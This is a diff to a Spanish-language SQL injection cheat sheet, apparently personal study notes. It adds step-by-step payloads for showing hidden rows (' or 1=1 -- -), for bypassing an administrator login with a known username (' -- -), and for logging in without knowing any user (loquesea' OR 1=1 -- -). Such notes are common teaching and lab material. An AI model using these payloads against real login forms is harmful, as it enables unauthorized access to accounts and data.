@@ -145,7 +145,7 @@ __MySQL__  SELECT SLEEP(10)
 ### Payloads usados en SQL
 
 > Mostrar todo
-* or 1=1 -- -
+* ' or 1=1 -- -
 
 > Probar cuántas columnas tiene la consulta
 * order by 3
@@ -153,9 +153,25 @@ __MySQL__  SELECT SLEEP(10)
 
 ### Extrayendo informacion oculta
 
-> Agregamos
+1. Buscamos por una categoria
+2. Le ponemos una categoria inexistente (_opcional_)
+3. Probamos el payload: ' or 1=1 -- -
 
 
+### Bypass al login Administrator
+
+1. Entramos al login
+2. Agregamos el usuario (_que ya conocemos_)
+3. Le agregamos el payload: ' -- -
+4. Ponemos un password cualquiera 
+
+
+### Bypass al login sin conocer usuario
+
+1. Entramos al login
+2. Agregamos en usuario el payload: loquesea' OR 1=1 -- -
+3. De esta manera nos logueamos con el primer usuario 
+*  con suerte podría ser el Administrador
 
 
 
